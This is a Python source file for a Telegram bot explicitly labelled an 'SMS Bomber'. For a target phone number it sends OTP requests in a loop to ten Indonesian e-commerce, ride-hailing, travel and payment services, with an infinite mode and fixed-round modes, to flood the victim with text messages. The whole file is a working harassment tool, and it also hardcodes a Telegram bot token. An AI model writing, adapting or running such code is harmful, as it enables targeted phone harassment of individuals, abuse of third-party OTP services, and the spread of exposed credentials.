# main.py
import threading
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, ConversationHandler
)

BOT_TOKEN = "8570263440:AAESv81BEry1XaWEI5NMOc0_EjY5NFo1mkw"
DEFAULT_DELAY = 1
PHONE, MODE = range(2)
stop_events = {}

import requests

def gateways(phone):
    raw = phone.replace("+", "").replace(" ", "")
    return [
        lambda: requests.post(
            "https://accounts.tokopedia.com/otp/c/page",
            data={"phone": phone, "otp_type": "1"},
            timeout=5
        ),
        lambda: requests.post(
            "https://api.gojek.com/gauth/v1/otp/send",
            json={"phone_number": phone},
            headers={"Content-Type": "application/json"},
            timeout=5
        ),
        lambda: requests.post(
            "https://p.grabtaxi.com/api/passenger/v2/profiles/otp",
            json={"phoneNumber": phone},
            headers={"Content-Type": "application/json"},
            timeout=5
        ),
        lambda: requests.post(
            "https://api.bukalapak.com/v2/users/send_otp",
            json={"phone": phone},
            timeout=5
        ),
        lambda: requests.post(
            "https://shopee.co.id/api/v2/user/send_sms_otp/",
            json={"phone_number": raw, "type": 0},
            headers={"Content-Type": "application/json"},
            timeout=5
        ),
        lambda: requests.post(
            "https://api.traveloka.com/v2/user/otp/send",
            json={"phoneNumber": phone},
            timeout=5
        ),
        lambda: requests.post(
            "https://www.tiket.com/api/auth/otp/send",
            json={"phone": phone},
            timeout=5
        ),
        lambda: requests.post(
            "https://www.blibli.com/backend/api/v2/otp/send",
            json={"phone": raw},
            timeout=5
        ),
        lambda: requests.post(
            "https://www.lazada.co.id/customer/account/otp/",
            json={"mobile": raw},
            timeout=5
        ),
        lambda: requests.post(
            "https://api.dana.id/v1.0/otp/send",
            json={"mobileNumber": phone},
            headers={"Content-Type": "application/json"},
            timeout=5
        ),
    ]

def bomb_infinite(phone: str, delay: float, stop_event):
    while not stop_event.is_set():
        for gw in gateways(phone):
            if stop_event.is_set():
                break
            try:
                gw()
            except Exception:
                pass
        import time
        time.sleep(delay)

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💣 SMS Bomber Online\n\n"
        "/bomb — start bombing\n"
        "/stop — kill bomber"
    )

async def bomb_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Target phone number? (with country code ex: +628xxxxxxxxxx)")
    return PHONE

async def get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["phone"] = update.message.text.strip()
    await update.message.reply_text(
        "Mode?\n1 — Infinite (until /stop)\n2 — 50 rounds\n3 — 100 rounds\n\nSend 1, 2, or 3"
    )
    return MODE

async def get_mode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    phone = ctx.user_data["phone"]
    uid = update.effective_user.id

    rounds = {
        "1": 0,
        "2": 50,
        "3": 100
    }.get(text, 0)

    stop_event = threading.Event()
    stop_events[uid] = stop_event

    if rounds == 0:
        await update.message.reply_text(f"🔥 Infinite bombing {phone}\nSend /stop to kill it.")
        def run():
            bomb_infinite(phone, DEFAULT_DELAY, stop_event)
        threading.Thread(target=run, daemon=True).start()
    else:
        await update.message.reply_text(f"🚀 Bombing {phone} × {rounds} rounds. Firing...")
        def run():
            import time
            count = 0
            while count < rounds and not stop_event.is_set():
                for gw in gateways(phone):
                    if stop_event.is_set():
                        break
                    try:
                        gw()
                    except Exception:
                        pass
                count += 1
                time.sleep(DEFAULT_DELAY)
            import asyncio
            asyncio.run(
                update.message.reply_text(f"✅ Done. {rounds} rounds fired on {phone}")
            )
        threading.Thread(target=run, daemon=True).start()

    return ConversationHandler.END

async def stop_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in stop_events:
        stop_events[uid].set()
        del stop_events[uid]
        await update.message.reply_text("🛑 Bomber stopped.")
    else:
        await update.message.reply_text("Nothing running rn.")

async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("bomb", bomb_cmd)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_mode)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(conv)

    print("Bot live. 6767.")
    app.run_polling()